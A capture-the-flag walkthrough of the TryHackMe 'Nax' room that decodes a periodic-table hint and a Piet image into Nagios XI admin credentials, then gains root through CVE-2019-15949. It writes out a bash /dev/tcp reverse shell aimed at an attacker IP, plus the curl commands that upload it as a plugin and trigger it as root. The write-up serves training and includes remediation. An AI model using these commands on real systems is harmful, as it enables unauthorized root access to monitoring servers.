# TryHackMe: Nax — From a Periodic-Table Riddle to Root on Nagios XI

*A walkthrough of the "Nax" room. The landing page hides a string of chemical
element symbols; decode them and they spell the path to an esoteric-language
program that literally paints the admin password. Those credentials open a
Nagios XI 5.5.6 panel whose plugin-upload feature runs as root, and CVE-2019-15949
turns that into a single, reliable jump from an anonymous HTTP request to a root
shell.*

> Flag and credential values are redacted. Nax is an authorized training box on
> TryHackMe; everything here was performed against a legal practice target.

---

## TL;DR — the whole chain

Homepage element-symbol hint → decode to `/PI3T.PNg` → run the **Piet** program
with `npiet` to recover `nagiosadmin` creds → log into **Nagios XI 5.5.6** →
upload a malicious monitoring plugin → trigger the System Profile download, which
runs the plugin **as root** (CVE-2019-15949) → **root shell**.

## The target

```bash
export IP=<target-ip>
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

```
22/tcp   open  ssh      OpenSSH
25/tcp   open  smtp
80/tcp   open  http
443/tcp  open  ssl/http Apache 2.4.18     # Nagios XI 5.5.6 (build 1540830265)
```

The star of the scan is the HTTPS service: a **Nagios XI 5.5.6** install on Apache.
Nagios XI is a network-monitoring product, and a monitoring server is a juicy
target — it usually holds broad network reach and stored check credentials. But
the admin panel wants a login we don't have yet, so we start on the public web
root.

## Enumeration: the homepage is talking to us

Browsing the site, the interesting detail isn't a directory or a backup file —
it's a sequence of **chemical element symbols** planted on the page:

```
Ag Hg Ta Sb Po Pd Hg Pt Lr
```

Nine symbols on a hacking box is not decoration; it's an encoding. The natural
move with the periodic table is to map each symbol to its **atomic number**:

```
Ag=47  Hg=80  Ta=73  Sb=51  Po=84  Pd=46  Hg=80  Pt=78  Lr=103
```

Read those numbers as **ASCII** and they spell a path:

```
47 80 73 51 84 46 80 78 103  ->  /  P  I  3  T  .  P  N  g
```

So the hint points at `/PI3T.PNg`. Grab it — no authentication required:

```bash
curl -sk https://$IP/PI3T.PNg -o PI3T.png
```

## Recovering the credentials: the password is a painting

`PI3T` is the giveaway. The file is a PNG, but its EXIF `Artist` tag reads
**Piet Mondrian** — a nod to **Piet**, an esoteric programming language whose
source code *is* an image: blocks of color are the instructions. This PNG is a
runnable Piet program.

Feed it to a public Piet interpreter (`npiet`) and it prints the Nagios XI admin
credentials:

```bash
# convert PNG -> PPM, then run it
pngtopnm PI3T.png > PI3T.ppm
npiet PI3T.ppm
# -> nagiosadmin%<redacted-password>
```

We now have `nagiosadmin` and its password. Note what just happened: the server
publishes its own admin credential on the unauthenticated web root — the only
"gate" is a puzzle, not a real access control.

## Foothold: authenticate to Nagios XI

Log in at the Nagios XI panel with the recovered `nagiosadmin` credentials.
Programmatically, that means grabbing a fresh `nsp` CSRF token from the login
page and POSTing it with the username and password:

```bash
# fetch login page -> extract nsp token -> POST credentials with cookie jar
# a 302 redirect to /nagiosxi/index.php == authenticated
```

The version banner already told us this is **5.5.6**, which sits squarely in the
range affected by **CVE-2019-15949** (Nagios XI ≤ 5.6.5). That CVE is our path
from admin-in-the-panel to root-on-the-box.

## Privilege escalation: CVE-2019-15949, plugin upload runs as root

The bug is a classic dangerous-by-design chain:

1. An authenticated admin can upload a **monitoring plugin** through
   `admin/monitoringplugins.php`. A plugin is just an executable file dropped
   into the Nagios plugins directory.
2. When a **System Profile** is generated
   (`includes/components/profile/profile.php?cmd=download`), the root-owned
   `getprofile.sh` script runs — and it's wired into a **passwordless `sudo`**
   entry, so it executes as **root**.
3. `getprofile.sh` runs the files in the plugins directory. Our uploaded plugin
   therefore executes as root.

So we upload a reverse-shell "plugin", then trigger the profile download to fire
it as root.

```bash
# 1. Payload plugin — a file whose body is a reverse shell
#    content:  bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
curl -sk https://$IP/nagiosxi/admin/monitoringplugins.php -b cookie \
  -F upload=1 -F nsp=<NSP> -F MAX_FILE_SIZE=20000000 \
  -F 'uploadedfile=@check_ping;filename=check_ping;type=text/plain'
#    -> "New plugin was installed"

# 2. Start a listener, then trigger execution as root
nc -lvnp 4444
curl -sk 'https://$IP/nagiosxi/includes/components/profile/profile.php?cmd=download' -b cookie
```

The listener catches a root shell:

```
connect to [ATTACKER] from (UNKNOWN) [<target-ip>] 35218
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
uid=0(root) gid=0(root) groups=0(root)
```

`uid=0`. From an anonymous HTTP request to root, no user interaction anywhere in
the chain. Read the flags (values redacted).

> Metasploit ships this as `exploit/linux/http/nagios_xi_plugins_check_plugin_rce`,
> and Jak Gibb's standalone PoC (Exploit-DB **47299**) automates the same steps.
> Doing it by hand once is worth more than the one-liner — you see exactly which
> endpoint does the upload and which one detonates it as root.

## Severity

**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). The whole
sequence is remote, unauthenticated, and deterministic. A short script goes from
cold to root in seconds, and a compromised Nagios server is a strong pivot into
the rest of the monitored network.

## Remediation — break the chain at any rung

1. **Patch Nagios XI** to ≥ 5.6.6, which fixes CVE-2019-15949, and remove the
   passwordless `sudo` entry that lets `getprofile.sh` execute plugin files as
   root. Monitoring-plugin upload should never be a root-code-execution path.
2. **Kill the credential leak.** Delete `/PI3T.PNg` and the homepage
   element-symbol hint, and **rotate the `nagiosadmin` password** — treat the
   leaked value as burned.
3. **Constrain plugin upload** to trusted operators and validate/sandbox uploaded
   plugins. Lock down SMTP and any anonymous LDAP bind that isn't needed.

## Takeaways

- **Odd data on a page is an encoding, not decoration.** Nine element symbols →
  atomic numbers → ASCII → a file path. When something looks like a puzzle, it is.
- **Esolangs hide secrets in plain sight.** A "PNG" whose EXIF artist is *Piet
  Mondrian* is a Piet program; the password was painted, not written.
- **A leaked credential is still a break-in.** Publishing admin creds on the web
  root — even obfuscated — is a full authentication bypass in slow motion.
- **Map the version to the CVE.** `Nagios XI 5.5.6` in the banner is a straight
  line to CVE-2019-15949 and a root-owned plugin runner.

*Cleanup note: the `check_ping` test plugin left on the box during the exercise
should be removed from Manage Plugins afterward.*

Thanks for reading. Nax is a great reminder that recon isn't only ports and
directories — sometimes the box is quietly handing you the keys, and the only
skill required is noticing.
